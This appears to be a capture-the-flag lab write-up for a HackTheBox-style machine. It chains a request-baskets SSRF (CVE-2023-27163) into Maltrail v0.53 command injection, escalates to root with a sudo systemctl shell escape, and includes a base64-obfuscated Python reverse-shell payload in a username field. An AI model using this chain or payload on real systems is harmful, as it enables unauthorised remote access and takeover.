@@ -1,0 +1,85 @@
+http://10.10.11.224:55555/web
+
+
+
+ - see below at "Powered by request-baskets | Version: 1.2.1"
+ - googling for "Request Basket exploits"
+ - i found: https://github.com/entr0pie/CVE-2023-27163
+ - see how it creates baskets
+ - all we need is the targets IP and port number along with
+   the address where we want to redirect our request
+   internally on the server through the SSRF vulnerability.
+ - we can run the exploit twice and create 2 baskets, one for each port.
+ - ./CVE-2023-27163.sh http://[target_ip]:55555 http://127.0.0.1:80
+ - got to http://[machine_ip]:55555/fnupdq
+ - as we can se below the server are using Maltrail (v0.53)
+ - googling for Maltrail 0.53 exploits
+ - i found: https://github.com/spookier/Maltrail-v0.53-Exploit
+ - download the repo
+ - set netcat to listen at 9991
+ - run: python3 mailtrail.py [tun0 interface ip] 9991 http://[machine_ip]:55555/[request_basket_id]
+ - now we have remote shell, search the user.txt flag
+ - we need to be root to acces /root/ and read root.txt
+ - escalate privileges by doing: 
+     1- sudo systemctl status trail.service
+     2- !sh
+ - now we have root privileges
+ - find and read root.txt
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+==============================================================================================
+Basket 'l7o9ec1' is successfully created!
+Your token is: wR_sA-5IRvnEE_31JeBg9X487ge7po3mQjQVKly9oRdP
+
+
+
+===========================
+CDN
+Cloudflare
+jQuery CDN
+cdnjs
+
+JavaScript libraries
+jQuery
+3.2.1
+Highlight.js
+
+UI frameworks
+Bootstrap
+3.3.7
+
+==============================================
+https://owasp.org/www-community/attacks/HTTP_Response_Splitting
+https://book.hacktricks.xyz/pentesting-web/crlf-0d-0a#http-header-injection
+https://akimbocore.com/article/http-header-injection/
+https://www.acunetix.com/websitesecurity/crlf-injection/
+
+
+username=;`echo+"cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxvcyxwdHk7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgiMTAuMTAuMTQuMTAwIiw4MDAwKSk7b3MuZHVwMihzLmZpbGVubygpLDApO29zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5vKCksMik7cHR5LnNwYXduKCIvYmluL3NoIikn"+|+base64+-d+|+sh`
+
+http://10.10.11.224:55555/40623k8/login
+
+https://www.exploit-db.com/exploits/51676
+
+https://github.com/spookier/Maltrail-v0.53-Exploit
+
+https://huntr.dev/bounties/be3c5204-fbd9-448d-b97c-96a8d2941e87/
